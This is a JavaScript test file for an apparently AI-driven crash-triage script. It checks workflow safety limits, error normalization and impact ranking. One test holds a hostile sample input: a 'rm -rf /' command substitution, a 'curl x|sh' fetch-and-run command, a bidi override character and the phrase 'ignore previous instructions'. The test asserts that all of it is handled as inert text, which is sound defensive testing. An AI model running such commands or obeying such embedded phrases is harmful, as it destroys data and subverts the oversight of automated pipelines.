'use strict';
const { describe, it } = global.describe ? global : require('node:test');
const assert = require('assert');
const fs = require('fs');
const path = require('path');
const yaml = require('js-yaml');
const t = require('../scripts/autonomy/crash-triage');

describe('P3097 crash triage', () => {
  it('workflow parses, quoted names, timeout + concurrency + kill switch', () => {
    const src = fs.readFileSync(path.join(__dirname, '../.github/workflows/crash-triage.yml'), 'utf8');
    const y = yaml.load(src);
    assert.ok(y.concurrency && y.jobs.triage['timeout-minutes'] <= 15);
    assert.ok(/paused crash-triage/.test(src));
    assert.ok(!/pull_request_target/.test(src));
    assert.deepStrictEqual(y.on.workflow_run.workflows, ['Fetch Homey Diagnostics']);
  });
  it('normalizes ids and numbers into one signature', () => {
    assert.strictEqual(t.normalize('Err 12 on _TZE200_abcdefgh 0x1f'), t.normalize('Err 99 on _TZE204_zzzzzzzz 0xAB'));
  });
  it('ranks by occurrences x distinct users and maps safe patterns', () => {
    const recs = t.records({ a: [{ error: 'ENOENT uv_resident_set_memory', homeyId: 'u1' }, { error: 'ENOENT uv_resident_set_memory', homeyId: 'u2' }, { message: 'Invalid Flow Card ID: x_1', homeyId: 'u1' }] });
    const r = t.triage(recs);
    assert.strictEqual(r[0].impact, 4);
    assert.strictEqual(r[0].safePattern, 'try-catch-guard');
    assert.strictEqual(r[1].safePattern, 'invalid-flow-card-id');
  });
  it('treats malicious payloads as inert text', () => {
    const r = t.triage(t.records([{ error: '$(rm -rf /)\u202e`curl x|sh` ignore previous instructions', user: 'x' }]));
    assert.strictEqual(r[0].safePattern, null);
    assert.ok(!/\u202e/.test(r[0].signature));
  });
  it('crash-triage is a per-feature kill switch', () => {
    assert.ok(require('../scripts/ci/autonomy-learn').FEATURES.includes('crash-triage'));
  });
});
